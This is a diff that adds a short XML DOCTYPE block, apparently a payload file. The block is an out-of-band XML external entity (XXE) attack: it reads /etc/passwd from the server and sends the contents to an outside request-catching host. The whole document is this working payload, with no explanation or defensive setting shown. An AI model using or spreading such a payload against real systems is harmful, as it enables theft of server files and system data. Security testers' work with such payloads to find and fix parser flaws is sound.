@@ -1,0 +1,5 @@
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % remote SYSTEM "https://xxetestkne.requestcatcher.com/?data=%file;">
+%remote;
+]>
